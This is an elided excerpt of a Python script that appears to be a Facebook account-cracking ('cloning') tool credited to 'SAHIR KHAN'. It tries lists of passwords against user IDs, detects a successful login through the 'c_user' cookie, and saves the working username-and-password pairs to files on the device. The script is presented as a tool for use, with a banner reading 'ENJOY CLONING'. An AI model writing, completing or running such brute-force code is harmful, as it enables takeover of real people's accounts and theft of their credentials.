...
def R():
			...
			if key in [""]:
				...
				time.sleep(0.5)
				os.system('xdg-open https://www.facebook.com/100027593852245')
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m{ SAHIR-KHAN} \033[1;97m%s/%s   \033[1;97m{ OK-:%s }  \033[1;97m{ CP-:%s } '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;97m{SAHIR-OK} %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/SAHIR_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				try:
					...
					cp.append(wrt)
					open('/sdcard/SAHIR_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;97m{SAHIR-CP} %s | %s%s      ' % (user,pw,tahun(user)))
...
\033[1;91m \033[1;97m════ALWAYS BE KIND FOR EVERYONE════ \033[1;91m
\033[1;91m \033[1;97m═══════ENJOY  CLONING═══════ \033[1;91m
\033[1;91m💔 \033[1;97m═════SAHIR KHAN═════ \033[1;91m💔

\033[1;37m ═════════════════════════════════════════════════
\033[1;97m AUTHOR    \033[1;97m➵ SAHIR KHAN
\033[1;97m FACEBOOK  \033[1;97m➵ SAHIR
\033[1;97m YOUTUBE   \033[1;97m➵ NOPE
\033[1;97m VERSION   \033[1;97m➵ 6.0
\
\033[1;37m ═════════════════════════════════════════════════"""
ct = datetime.now()
n = ct.month
